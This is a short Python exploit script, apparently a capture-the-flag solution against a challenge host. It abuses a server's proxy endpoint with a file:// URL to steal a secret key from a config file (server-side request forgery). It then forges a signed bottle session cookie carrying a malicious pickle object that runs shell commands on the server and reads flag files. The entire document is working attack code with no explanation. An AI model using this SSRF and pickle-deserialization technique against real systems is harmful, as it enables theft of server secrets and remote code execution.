import secrets
import requests
import pickle
import hmac
import base64
import hashlib

import bottle

BASE_URL = 'https://ssrf.h4ck3r.quest'

req = requests.session()
req.get(BASE_URL)  # Get the cookie


# get secret key
secret = req.get(BASE_URL + '/proxy',
                 params={'url': 'file://127.01/sup3rrrrr/secret/server/configs/__init__.py'}).text.split('=')[1].strip()[1:-1]

print('secret =', secret)


class Exploit:
    def __reduce__(self):
        return (eval, ('__import__("os").popen("cat /*f*").read()',))


exp = bottle.cookie_encode(
    ('session', {"payloads": [Exploit()]}),
    secret
).decode()

print("cookie exploit =", exp)

print(requests.get(BASE_URL, cookies={'session': exp}).text)
